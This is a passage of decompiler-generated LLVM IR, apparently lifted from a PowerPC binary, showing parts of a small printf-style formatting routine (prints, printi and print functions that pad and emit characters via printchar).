  %v4_10009abc30 = phi i32 [ %v1_10009ab4, %dec_label_pc_10009aa4 ], [ %tmp, %dec_label_pc_10009a90 ]
  %stack_var_-20.029 = phi i32 [ %v1_10009aa8, %dec_label_pc_10009aa4 ], [ 0, %dec_label_pc_10009a90 ]
  %v1_10009aa8 = add i32 %stack_var_-20.029, 1
  %v1_10009ab4 = add i32 %v4_10009abc30, 1
  %v5_10009ab8 = inttoptr i32 %v1_10009ab4 to i8*
  %v2_10009ac0 = load i8, i8* %v5_10009ab8, align 1
  %v3_10009ac8 = icmp eq i8 %v2_10009ac0, 0
  br i1 %v3_10009ac8, label %dec_label_pc_10009ad0, label %dec_label_pc_10009aa4

dec_label_pc_10009ad0:                            ; preds = %dec_label_pc_10009aa4, %dec_label_pc_10009a90
  %stack_var_-20.0.lcssa = phi i32 [ 0, %dec_label_pc_10009a90 ], [ %v1_10009aa8, %dec_label_pc_10009aa4 ]
  %v2_10009ad8 = icmp slt i32 %stack_var_-20.0.lcssa, %arg3
  br i1 %v2_10009ad8, label %dec_label_pc_10009aec, label %dec_label_pc_10009afc

dec_label_pc_10009aec:                            ; preds = %dec_label_pc_10009ad0
  %v2_10009af4 = sub i32 %arg3, %stack_var_-20.0.lcssa
  br label %dec_label_pc_10009afc

dec_label_pc_10009afc:                            ; preds = %dec_label_pc_10009ad0, %dec_label_pc_10009aec
  %storemerge2 = phi i32 [ %v2_10009af4, %dec_label_pc_10009aec ], [ 0, %dec_label_pc_10009ad0 ]
  %v1_10009b00 = call i32 @__asm_rlwinm(i32 %arg4, i32 0, i32 30, i32 30)
  %v3_10009b04 = icmp eq i32 %v1_10009b00, 0
  br i1 %v3_10009b04, label %dec_label_pc_10009b14, label %dec_label_pc_10009b0c

dec_label_pc_10009b0c:                            ; preds = %dec_label_pc_10009afc
  br label %dec_label_pc_10009b14

dec_label_pc_10009b14:                            ; preds = %dec_label_pc_10009afc, %entry, %dec_label_pc_10009b0c
  %stack_var_-32.0 = phi i32 [ %arg3, %entry ], [ %storemerge2, %dec_label_pc_10009afc ], [ %storemerge2, %dec_label_pc_10009b0c ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_10009afc ], [ 48, %dec_label_pc_10009b0c ]
  %v1_10009b18 = urem i32 %arg4, 2
  %v3_10009b1c = icmp eq i32 %v1_10009b18, 0
  br i1 %v3_10009b1c, label %dec_label_pc_10009b4c.preheader, label %dec_label_pc_10009b8c.preheader

dec_label_pc_10009b4c.preheader:                  ; preds = %dec_label_pc_10009b14
  %v2_10009b5018 = icmp sgt i32 %stack_var_-32.0, 0
  br i1 %v2_10009b5018, label %dec_label_pc_10009b28.lr.ph, label %dec_label_pc_10009b8c.preheader

dec_label_pc_10009b28.lr.ph:                      ; preds = %dec_label_pc_10009b4c.preheader
  %v2_10009b30 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_10009b28

dec_label_pc_10009b28:                            ; preds = %dec_label_pc_10009b28.lr.ph, %dec_label_pc_10009b28
  %stack_var_-32.121 = phi i32 [ %stack_var_-32.0, %dec_label_pc_10009b28.lr.ph ], [ %v1_10009b44, %dec_label_pc_10009b28 ]
  %v3_10009b30 = call i32 @printchar(i32* %v2_10009b30, i32 %stack_var_-16.0)
  %v1_10009b44 = add nsw i32 %stack_var_-32.121, -1
  %v2_10009b50 = icmp sgt i32 %stack_var_-32.121, 1
  br i1 %v2_10009b50, label %dec_label_pc_10009b28, label %dec_label_pc_10009b8c.preheader

dec_label_pc_10009b8c.preheader:                  ; preds = %dec_label_pc_10009b28, %dec_label_pc_10009b4c.preheader, %dec_label_pc_10009b14
  %stack_var_-12.1.ph = phi i32 [ 0, %dec_label_pc_10009b14 ], [ 0, %dec_label_pc_10009b4c.preheader ], [ %stack_var_-32.0, %dec_label_pc_10009b28 ]
  %stack_var_-32.2.ph = phi i32 [ %stack_var_-32.0, %dec_label_pc_10009b14 ], [ %stack_var_-32.0, %dec_label_pc_10009b4c.preheader ], [ 0, %dec_label_pc_10009b28 ]
  %v2_10009b909 = load i8, i8* %arg2, align 1
  %v3_10009b9812 = icmp eq i8 %v2_10009b909, 0
  br i1 %v3_10009b9812, label %dec_label_pc_10009bc8.preheader, label %dec_label_pc_10009b5c.lr.ph

dec_label_pc_10009b5c.lr.ph:                      ; preds = %dec_label_pc_10009b8c.preheader
  %v2_10009b70 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_10009b5c

dec_label_pc_10009b5c:                            ; preds = %dec_label_pc_10009b5c.lr.ph, %dec_label_pc_10009b5c
  %v4_10009b8c15 = phi i32 [ %tmp, %dec_label_pc_10009b5c.lr.ph ], [ %v1_10009b84, %dec_label_pc_10009b5c ]
  %stack_var_-36.014 = phi i8* [ %arg2, %dec_label_pc_10009b5c.lr.ph ], [ %v5_10009b88, %dec_label_pc_10009b5c ]
  %stack_var_-12.113 = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10009b5c.lr.ph ], [ %v1_10009b78, %dec_label_pc_10009b5c ]
  %v2_10009b60 = load i8, i8* %stack_var_-36.014, align 1
  %v3_10009b60 = zext i8 %v2_10009b60 to i32
  %v3_10009b70 = call i32 @printchar(i32* %v2_10009b70, i32 %v3_10009b60)
  %v1_10009b78 = add i32 %stack_var_-12.113, 1
  %v1_10009b84 = add i32 %v4_10009b8c15, 1
  %v5_10009b88 = inttoptr i32 %v1_10009b84 to i8*
  %v2_10009b90 = load i8, i8* %v5_10009b88, align 1
  %v3_10009b98 = icmp eq i8 %v2_10009b90, 0
  br i1 %v3_10009b98, label %dec_label_pc_10009bc8.preheader, label %dec_label_pc_10009b5c

dec_label_pc_10009bc8.preheader:                  ; preds = %dec_label_pc_10009b5c, %dec_label_pc_10009b8c.preheader
  %stack_var_-12.1.lcssa = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10009b8c.preheader ], [ %v1_10009b78, %dec_label_pc_10009b5c ]
  %v2_10009bcc4 = icmp sgt i32 %stack_var_-32.2.ph, 0
  br i1 %v2_10009bcc4, label %dec_label_pc_10009ba4.lr.ph, label %dec_label_pc_10009bd4

dec_label_pc_10009ba4.lr.ph:                      ; preds = %dec_label_pc_10009bc8.preheader
  %v2_10009bac = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_10009ba4

dec_label_pc_10009ba4:                            ; preds = %dec_label_pc_10009ba4.lr.ph, %dec_label_pc_10009ba4
  %stack_var_-32.37 = phi i32 [ %stack_var_-32.2.ph, %dec_label_pc_10009ba4.lr.ph ], [ %v1_10009bc0, %dec_label_pc_10009ba4 ]
  %v3_10009bac = call i32 @printchar(i32* %v2_10009bac, i32 %stack_var_-16.0)
  %v1_10009bc0 = add nsw i32 %stack_var_-32.37, -1
  %v2_10009bcc = icmp sgt i32 %stack_var_-32.37, 1
  br i1 %v2_10009bcc, label %dec_label_pc_10009ba4, label %dec_label_pc_10009bc8.dec_label_pc_10009bd4_crit_edge

dec_label_pc_10009bc8.dec_label_pc_10009bd4_crit_edge: ; preds = %dec_label_pc_10009ba4
  %tmp45 = add i32 %stack_var_-12.1.lcssa, %stack_var_-32.2.ph
  br label %dec_label_pc_10009bd4

dec_label_pc_10009bd4:                            ; preds = %dec_label_pc_10009bc8.dec_label_pc_10009bd4_crit_edge, %dec_label_pc_10009bc8.preheader
  %stack_var_-12.2.lcssa = phi i32 [ %tmp45, %dec_label_pc_10009bc8.dec_label_pc_10009bd4_crit_edge ], [ %stack_var_-12.1.lcssa, %dec_label_pc_10009bc8.preheader ]
  ret i32 %stack_var_-12.2.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-12.1.lcssa, { 1, 0 }
  uselistorder i32 %v1_10009b84, { 1, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %stack_var_-20.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_10009ab4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009ba4, { 1, 0 }
  uselistorder label %dec_label_pc_10009b5c, { 1, 0 }
  uselistorder label %dec_label_pc_10009b28, { 1, 0 }
  uselistorder label %dec_label_pc_10009b14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009afc, { 1, 0 }
  uselistorder label %dec_label_pc_10009aa4, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg6, i32* @r8, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %v3_10009c40 = icmp eq i32 %arg2, 0
  br i1 %v3_10009c40, label %dec_label_pc_10009c48, label %dec_label_pc_10009c7c

dec_label_pc_10009c48:                            ; preds = %entry
  store i32 48, i32* %stack_var_-88, align 4
  %v4_10009c6c = bitcast i32* %stack_var_-88 to i8*
  %v5_10009c6c = call i32 @prints(i32 %arg1, i8* %v4_10009c6c, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_10009dd4

dec_label_pc_10009c7c:                            ; preds = %entry
  %v3_10009c80 = icmp eq i32 %arg4, 0
  br i1 %v3_10009c80, label %dec_label_pc_10009cb4, label %dec_label_pc_10009c88

dec_label_pc_10009c88:                            ; preds = %dec_label_pc_10009c7c
  %v3_10009c8c = icmp eq i32 %arg3, 10
  br i1 %v3_10009c8c, label %dec_label_pc_10009c94, label %dec_label_pc_10009cb4

dec_label_pc_10009c94:                            ; preds = %dec_label_pc_10009c88
  %tmp27 = icmp sgt i32 %arg2, -1
  br i1 %tmp27, label %dec_label_pc_10009cb4, label %dec_label_pc_10009ca0

dec_label_pc_10009ca0:                            ; preds = %dec_label_pc_10009c94
  %v1_10009cac = sub i32 0, %arg2
  br label %dec_label_pc_10009cb4

dec_label_pc_10009cb4:                            ; preds = %dec_label_pc_10009c88, %dec_label_pc_10009c94, %dec_label_pc_10009c7c, %dec_label_pc_10009ca0
  %stack_var_-44.0 = phi i32 [ %arg2, %dec_label_pc_10009c7c ], [ %arg2, %dec_label_pc_10009c94 ], [ %v1_10009cac, %dec_label_pc_10009ca0 ], [ %arg2, %dec_label_pc_10009c88 ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_10009c7c ], [ 0, %dec_label_pc_10009c94 ], [ 1, %dec_label_pc_10009ca0 ], [ 0, %dec_label_pc_10009c88 ]
  %tmp28 = bitcast i32* %stack_var_-77 to i8*
  store i8 0, i8* %tmp28, align 4
  %v3_10009d405 = icmp eq i32 %stack_var_-44.0, 0
  br i1 %v3_10009d405, label %dec_label_pc_10009d48, label %dec_label_pc_10009ccc.lr.ph

dec_label_pc_10009ccc.lr.ph:                      ; preds = %dec_label_pc_10009cb4
  %v2_10009cfc = add i32 %arg7, -58
  br label %dec_label_pc_10009ccc

dec_label_pc_10009ccc:                            ; preds = %dec_label_pc_10009ccc.lr.ph, %dec_label_pc_10009d08
  %stack_var_-44.17 = phi i32 [ %stack_var_-44.0, %dec_label_pc_10009ccc.lr.ph ], [ %v2_10009d34, %dec_label_pc_10009d08 ]
  %stack_var_-28.06 = phi i8* [ %tmp28, %dec_label_pc_10009ccc.lr.ph ], [ %v5_10009d10, %dec_label_pc_10009d08 ]
  %v2_10009cd4 = urem i32 %stack_var_-44.17, %arg3
  %tmp29 = icmp slt i32 %v2_10009cd4, 10
  br i1 %tmp29, label %dec_label_pc_10009d08, label %dec_label_pc_10009cf4

dec_label_pc_10009cf4:                            ; preds = %dec_label_pc_10009ccc
  %v1_10009d00 = add i32 %v2_10009cfc, %v2_10009cd4
  br label %dec_label_pc_10009d08

dec_label_pc_10009d08:                            ; preds = %dec_label_pc_10009ccc, %dec_label_pc_10009cf4
  %stack_var_-32.0 = phi i32 [ %v2_10009cd4, %dec_label_pc_10009ccc ], [ %v1_10009d00, %dec_label_pc_10009cf4 ]
  %v4_10009d08 = ptrtoint i8* %stack_var_-28.06 to i32
  %v1_10009d0c = add i32 %v4_10009d08, -1
  %v5_10009d10 = inttoptr i32 %v1_10009d0c to i8*
  %fold = add i32 %stack_var_-32.0, 48
  %v1_10009d28 = trunc i32 %fold to i8
  store i8 %v1_10009d28, i8* %v5_10009d10, align 1
  %v2_10009d34 = udiv i32 %stack_var_-44.17, %arg3
  %v3_10009d40 = icmp ult i32 %stack_var_-44.17, %arg3
  br i1 %v3_10009d40, label %dec_label_pc_10009d48, label %dec_label_pc_10009ccc

dec_label_pc_10009d48:                            ; preds = %dec_label_pc_10009d08, %dec_label_pc_10009cb4
  %stack_var_-28.0.lcssa = phi i8* [ %tmp28, %dec_label_pc_10009cb4 ], [ %v5_10009d10, %dec_label_pc_10009d08 ]
  %v3_10009d4c = icmp eq i32 %stack_var_-36.0, 0
  br i1 %v3_10009d4c, label %dec_label_pc_10009db0, label %dec_label_pc_10009d54

dec_label_pc_10009d54:                            ; preds = %dec_label_pc_10009d48
  %v3_10009d58 = icmp eq i32 %arg5, 0
  br i1 %v3_10009d58, label %dec_label_pc_10009d98, label %dec_label_pc_10009d60

dec_label_pc_10009d60:                            ; preds = %dec_label_pc_10009d54
  %v1_10009d64 = call i32 @__asm_rlwinm(i32 %arg6, i32 0, i32 30, i32 30)
  %v3_10009d68 = icmp eq i32 %v1_10009d64, 0
  br i1 %v3_10009d68, label %dec_label_pc_10009d98, label %dec_label_pc_10009d70

dec_label_pc_10009d70:                            ; preds = %dec_label_pc_10009d60
  %v2_10009d78 = inttoptr i32 %arg1 to i32*
  %v3_10009d78 = call i32 @printchar(i32* %v2_10009d78, i32 45)
  %v1_10009d8c = add i32 %arg5, -1
  br label %dec_label_pc_10009db0

dec_label_pc_10009d98:                            ; preds = %dec_label_pc_10009d60, %dec_label_pc_10009d54
  %v4_10009d98 = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v1_10009d9c = add i32 %v4_10009d98, -1
  %v5_10009da0 = inttoptr i32 %v1_10009d9c to i8*
  store i8 45, i8* %v5_10009da0, align 1
  br label %dec_label_pc_10009db0

dec_label_pc_10009db0:                            ; preds = %dec_label_pc_10009d48, %dec_label_pc_10009d70, %dec_label_pc_10009d98
  %stack_var_-28.1 = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_10009d48 ], [ %v5_10009da0, %dec_label_pc_10009d98 ], [ %stack_var_-28.0.lcssa, %dec_label_pc_10009d70 ]
  %stack_var_-56.0 = phi i32 [ %arg5, %dec_label_pc_10009d48 ], [ %arg5, %dec_label_pc_10009d98 ], [ %v1_10009d8c, %dec_label_pc_10009d70 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_10009d48 ], [ 0, %dec_label_pc_10009d98 ], [ 1, %dec_label_pc_10009d70 ]
  %v5_10009dc0 = call i32 @prints(i32 %arg1, i8* %stack_var_-28.1, i32 %stack_var_-56.0, i32 %arg6)
  %v2_10009dcc = add i32 %v5_10009dc0, %stack_var_-40.0
  br label %dec_label_pc_10009dd4

dec_label_pc_10009dd4:                            ; preds = %dec_label_pc_10009c48, %dec_label_pc_10009db0
  %storemerge = phi i32 [ %v2_10009dcc, %dec_label_pc_10009db0 ], [ %v5_10009c6c, %dec_label_pc_10009c48 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-28.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_10009d10, { 0, 2, 1 }
  uselistorder i32 %v2_10009cd4, { 1, 0, 2 }
  uselistorder i32 %stack_var_-44.17, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2, 3 }
  uselistorder i32 %arg5, { 1, 3, 0, 2, 4 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009dd4, { 1, 0 }
  uselistorder label %dec_label_pc_10009db0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009d08, { 1, 0 }
  uselistorder label %dec_label_pc_10009ccc, { 1, 0 }
  uselistorder label %dec_label_pc_10009cb4, { 3, 1, 0, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp41 = ptrtoint i32* %arg1 to i32
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-68.427 = inttoptr i32 %arg2 to i8*
  %v2_1000a3c428 = load i8, i8* %stack_var_-68.427, align 1
  %v3_1000a3cc31 = icmp eq i8 %v2_1000a3c428, 0
  br i1 %v3_1000a3cc31, label %dec_label_pc_1000a3d4, label %dec_label_pc_10009e20.lr.ph

dec_label_pc_10009e20.lr.ph:                      ; preds = %entry
  %v1_10009f94 = add i32 %arg3, 4
  %v2_10009f94 = inttoptr i32 %v1_10009f94 to i32*
  %v1_10009f5c = add i32 %arg3, 8
  %v2_10009f5c = inttoptr i32 %v1_10009f5c to i32*
  %v4_1000a378 = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_10009e20

dec_label_pc_10009e20:                            ; preds = %dec_label_pc_10009e20.lr.ph, %dec_label_pc_1000a3b4
  %stack_var_-68.434 = phi i8* [ %stack_var_-68.427, %dec_label_pc_10009e20.lr.ph ], [ %stack_var_-68.4, %dec_label_pc_1000a3b4 ]
  %stack_var_-68.4.in33 = phi i32 [ %arg2, %dec_label_pc_10009e20.lr.ph ], [ %v1_1000a3b8, %dec_label_pc_1000a3b4 ]
  %stack_var_-56.132 = phi i32 [ 0, %dec_label_pc_10009e20.lr.ph ], [ %stack_var_-56.0, %dec_label_pc_1000a3b4 ]
  %v2_10009e24 = load i8, i8* %stack_var_-68.434, align 1
  %v3_10009e2c = icmp eq i8 %v2_10009e24, 37
  br i1 %v3_10009e2c, label %dec_label_pc_10009e34, label %dec_label_pc_1000a390

dec_label_pc_10009e34:                            ; preds = %dec_label_pc_10009e20
  %v1_10009e38 = add i32 %stack_var_-68.4.in33, 1
  %v5_10009e3c = inttoptr i32 %v1_10009e38 to i8*
  %v2_10009e54 = load i8, i8* %v5_10009e3c, align 1
  %v3_10009e5c = icmp eq i8 %v2_10009e54, 0
  br i1 %v3_10009e5c, label %dec_label_pc_1000a3d4, label %dec_label_pc_10009e64

dec_label_pc_10009e64:                            ; preds = %dec_label_pc_10009e34
  %v2_10009e68 = load i8, i8* %v5_10009e3c, align 1
  %v3_10009e70 = icmp eq i8 %v2_10009e68, 37
  br i1 %v3_10009e70, label %dec_label_pc_1000a390, label %dec_label_pc_10009e78

dec_label_pc_10009e78:                            ; preds = %dec_label_pc_10009e64
  %v2_10009e7c = load i8, i8* %v5_10009e3c, align 1
  %v3_10009e84 = icmp eq i8 %v2_10009e7c, 45
  br i1 %v3_10009e84, label %dec_label_pc_10009e8c, label %dec_label_pc_10009ebc.preheader

dec_label_pc_10009e8c:                            ; preds = %dec_label_pc_10009e78
  %v1_10009e90 = add i32 %stack_var_-68.4.in33, 2
  %v5_10009e94 = inttoptr i32 %v1_10009e90 to i8*
  br label %dec_label_pc_10009ebc.preheader

dec_label_pc_10009ebc.preheader:                  ; preds = %dec_label_pc_10009e8c, %dec_label_pc_10009e78
  %stack_var_-68.0.ph = phi i8* [ %v5_10009e3c, %dec_label_pc_10009e78 ], [ %v5_10009e94, %dec_label_pc_10009e8c ]
  %stack_var_-52.0.ph = phi i32 [ 0, %dec_label_pc_10009e78 ], [ 1, %dec_label_pc_10009e8c ]
  %v4_10009ebc3 = ptrtoint i8* %stack_var_-68.0.ph to i32
  %v2_10009ec04 = load i8, i8* %stack_var_-68.0.ph, align 1
  %v3_10009ec88 = icmp eq i8 %v2_10009ec04, 48
  br i1 %v3_10009ec88, label %dec_label_pc_10009ea4, label %dec_label_pc_10009f08.preheader

dec_label_pc_10009ea4:                            ; preds = %dec_label_pc_10009ebc.preheader, %dec_label_pc_10009ea4
  %v4_10009ebc10 = phi i32 [ %v1_10009ea8, %dec_label_pc_10009ea4 ], [ %v4_10009ebc3, %dec_label_pc_10009ebc.preheader ]
  %stack_var_-52.09 = phi i32 [ %v1_10009eb4, %dec_label_pc_10009ea4 ], [ %stack_var_-52.0.ph, %dec_label_pc_10009ebc.preheader ]
  %v1_10009ea8 = add i32 %v4_10009ebc10, 1
  %v5_10009eac = inttoptr i32 %v1_10009ea8 to i8*
  %v1_10009eb4 = or i32 %stack_var_-52.09, 2
  %v2_10009ec0 = load i8, i8* %v5_10009eac, align 1
  %v3_10009ec8 = icmp eq i8 %v2_10009ec0, 48
  br i1 %v3_10009ec8, label %dec_label_pc_10009ea4, label %dec_label_pc_10009f08.preheader

dec_label_pc_10009f08.preheader:                  ; preds = %dec_label_pc_10009ea4, %dec_label_pc_10009ebc.preheader
  %stack_var_-52.0.lcssa = phi i32 [ %stack_var_-52.0.ph, %dec_label_pc_10009ebc.preheader ], [ %v1_10009eb4, %dec_label_pc_10009ea4 ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.0.ph, %dec_label_pc_10009ebc.preheader ], [ %v5_10009eac, %dec_label_pc_10009ea4 ]
  %v4_10009f0812 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v2_10009f0c13 = load i8, i8* %stack_var_-68.0.lcssa, align 1
  %tmp62 = icmp ult i8 %v2_10009f0c13, 48
  br i1 %tmp62, label %dec_label_pc_10009f30, label %dec_label_pc_10009f1c

dec_label_pc_10009ed4:                            ; preds = %dec_label_pc_10009f1c
  %v1_10009ed8 = mul i32 %stack_var_-48.018, 10
  %v2_10009ee4 = load i8, i8* %stack_var_-68.119, align 1
  %v3_10009ee4 = zext i8 %v2_10009ee4 to i32
  %v2_10009ef0 = add i32 %v1_10009ed8, -48
  %v1_10009ef4 = add i32 %v2_10009ef0, %v3_10009ee4
  %v1_10009f00 = add i32 %v4_10009f0820, 1
  %v5_10009f04 = inttoptr i32 %v1_10009f00 to i8*
  %v2_10009f0c = load i8, i8* %v5_10009f04, align 1
  %tmp63 = icmp ult i8 %v2_10009f0c, 48
  br i1 %tmp63, label %dec_label_pc_10009f30, label %dec_label_pc_10009f1c

dec_label_pc_10009f1c:                            ; preds = %dec_label_pc_10009f08.preheader, %dec_label_pc_10009ed4
  %v4_10009f0820 = phi i32 [ %v1_10009f00, %dec_label_pc_10009ed4 ], [ %v4_10009f0812, %dec_label_pc_10009f08.preheader ]
  %stack_var_-68.119 = phi i8* [ %v5_10009f04, %dec_label_pc_10009ed4 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_10009f08.preheader ]
  %stack_var_-48.018 = phi i32 [ %v1_10009ef4, %dec_label_pc_10009ed4 ], [ 0, %dec_label_pc_10009f08.preheader ]
  %v2_10009f20 = load i8, i8* %stack_var_-68.119, align 1
  %tmp64 = icmp ult i8 %v2_10009f20, 58
  br i1 %tmp64, label %dec_label_pc_10009ed4, label %dec_label_pc_10009f30

dec_label_pc_10009f30:                            ; preds = %dec_label_pc_10009ed4, %dec_label_pc_10009f1c, %dec_label_pc_10009f08.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_10009f08.preheader ], [ %v1_10009ef4, %dec_label_pc_10009ed4 ], [ %stack_var_-48.018, %dec_label_pc_10009f1c ]
  %stack_var_-68.1.lcssa = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_10009f08.preheader ], [ %v5_10009f04, %dec_label_pc_10009ed4 ], [ %stack_var_-68.119, %dec_label_pc_10009f1c ]
  %v2_10009f34 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10009f3c = icmp eq i8 %v2_10009f34, 115
  br i1 %v3_10009f3c, label %dec_label_pc_10009f44, label %dec_label_pc_1000a004

dec_label_pc_10009f44:                            ; preds = %dec_label_pc_10009f30
  %v2_10009f48 = load i8, i8* %tmp, align 1
  %tmp65 = icmp ugt i8 %v2_10009f48, 7
  br i1 %tmp65, label %dec_label_pc_10009f90, label %dec_label_pc_10009f58

dec_label_pc_10009f58:                            ; preds = %dec_label_pc_10009f44
  %v3_10009f5c = load i32, i32* %v2_10009f5c, align 4
  %v2_10009f64 = load i8, i8* %tmp, align 1
  %v3_10009f64 = zext i8 %v2_10009f64 to i32
  %v1_10009f70 = mul nuw nsw i32 %v3_10009f64, 4
  %v2_10009f74 = add i32 %v1_10009f70, %v3_10009f5c
  %v1_10009f7c = add i8 %v2_10009f64, 1
  store i8 %v1_10009f7c, i8* %tmp, align 1
  br label %dec_label_pc_10009fa8

dec_label_pc_10009f90:                            ; preds = %dec_label_pc_10009f44
  %v3_10009f94 = load i32, i32* %v2_10009f94, align 4
  %v1_10009f9c = add i32 %v3_10009f94, 4
  store i32 %v1_10009f9c, i32* %v2_10009f94, align 4
  br label %dec_label_pc_10009fa8

dec_label_pc_10009fa8:                            ; preds = %dec_label_pc_10009f58, %dec_label_pc_10009f90
  %stack_var_-20.0 = phi i32 [ %v3_10009f94, %dec_label_pc_10009f90 ], [ %v2_10009f74, %dec_label_pc_10009f58 ]
  %v1_10009fac = inttoptr i32 %stack_var_-20.0 to i32*
  %v2_10009fac = load i32, i32* %v1_10009fac, align 4
  %v3_10009fb8 = icmp eq i32 %v2_10009fac, 0
  br i1 %v3_10009fb8, label %dec_label_pc_10009fcc, label %dec_label_pc_10009fc0

dec_label_pc_10009fc0:                            ; preds = %dec_label_pc_10009fa8
  %v5_10009fc4 = inttoptr i32 %v2_10009fac to i8*
  br label %dec_label_pc_10009fd8

dec_label_pc_10009fcc:                            ; preds = %dec_label_pc_10009fa8
  br label %dec_label_pc_10009fd8

dec_label_pc_10009fd8:                            ; preds = %dec_label_pc_10009fc0, %dec_label_pc_10009fcc
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1002b9f0.464, i32 0, i32 0), %dec_label_pc_10009fcc ], [ %v5_10009fc4, %dec_label_pc_10009fc0 ]
  %v6_10009fec = call i32 @prints(i32 %tmp41, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_10009ff8 = add i32 %v6_10009fec, %stack_var_-56.132
  br label %dec_label_pc_1000a3b4

dec_label_pc_1000a004:                            ; preds = %dec_label_pc_10009f30
  %v2_1000a008 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_1000a010 = icmp eq i8 %v2_1000a008, 100
  br i1 %v3_1000a010, label %dec_label_pc_1000a018, label %dec_label_pc_1000a0b8

dec_label_pc_1000a018:                            ; preds = %dec_label_pc_1000a004
  %v2_1000a01c = load i8, i8* %tmp, align 1
  %tmp66 = icmp ugt i8 %v2_1000a01c, 7
  br i1 %tmp66, label %dec_label_pc_1000a064, label %dec_label_pc_1000a02c

dec_label_pc_1000a02c:                            ; preds = %dec_label_pc_1000a018
  %v3_1000a030 = load i32, i32* %v2_10009f5c, align 4
  %v2_1000a038 = load i8, i8* %tmp, align 1
  %v3_1000a038 = zext i8 %v2_1000a038 to i32
  %v1_1000a044 = mul nuw nsw i32 %v3_1000a038, 4
  %v2_1000a048 = add i32 %v1_1000a044, %v3_1000a030
  %v1_1000a050 = add i8 %v2_1000a038, 1
  store i8 %v1_1000a050, i8* %tmp, align 1
  br label %dec_label_pc_1000a07c

dec_label_pc_1000a064:                            ; preds = %dec_label_pc_1000a018
  %v3_1000a068 = load i32, i32* %v2_10009f94, align 4
  %v1_1000a070 = add i32 %v3_1000a068, 4
  store i32 %v1_1000a070, i32* %v2_10009f94, align 4
  br label %dec_label_pc_1000a07c

dec_label_pc_1000a07c:                            ; preds = %dec_label_pc_1000a02c, %dec_label_pc_1000a064
  %stack_var_-28.0 = phi i32 [ %v3_1000a068, %dec_label_pc_1000a064 ], [ %v2_1000a048, %dec_label_pc_1000a02c ]
  %v1_1000a080 = inttoptr i32 %stack_var_-28.0 to i32*
  %v2_1000a080 = load i32, i32* %v1_1000a080, align 4
  %v7_1000a0a0 = call i32 @printi(i32 %tmp41, i32 %v2_1000a080, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_1000a0ac = add i32 %v7_1000a0a0, %stack_var_-56.132
  br label %dec_label_pc_1000a3b4

dec_label_pc_1000a0b8:                            ; preds = %dec_label_pc_1000a004
  %v2_1000a0bc = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_1000a0c4 = icmp eq i8 %v2_1000a0bc, 120
  br i1 %v3_1000a0c4, label %dec_label_pc_1000a0cc, label %dec_label_pc_1000a16c

dec_label_pc_1000a0cc:                            ; preds = %dec_label_pc_1000a0b8
  %v2_1000a0d0 = load i8, i8* %tmp, align 1
  %tmp67 = icmp ugt i8 %v2_1000a0d0, 7
  br i1 %tmp67, label %dec_label_pc_1000a118, label %dec_label_pc_1000a0e0

dec_label_pc_1000a0e0:                            ; preds = %dec_label_pc_1000a0cc
  %v3_1000a0e4 = load i32, i32* %v2_10009f5c, align 4
  %v2_1000a0ec = load i8, i8* %tmp, align 1
  %v3_1000a0ec = zext i8 %v2_1000a0ec to i32
  %v1_1000a0f8 = mul nuw nsw i32 %v3_1000a0ec, 4
  %v2_1000a0fc = add i32 %v1_1000a0f8, %v3_1000a0e4
  %v1_1000a104 = add i8 %v2_1000a0ec, 1
  store i8 %v1_1000a104, i8* %tmp, align 1
  br label %dec_label_pc_1000a130

dec_label_pc_1000a118:                            ; preds = %dec_label_pc_1000a0cc
  %v3_1000a11c = load i32, i32* %v2_10009f94, align 4
  %v1_1000a124 = add i32 %v3_1000a11c, 4
  store i32 %v1_1000a124, i32* %v2_10009f94, align 4
  br label %dec_label_pc_1000a130

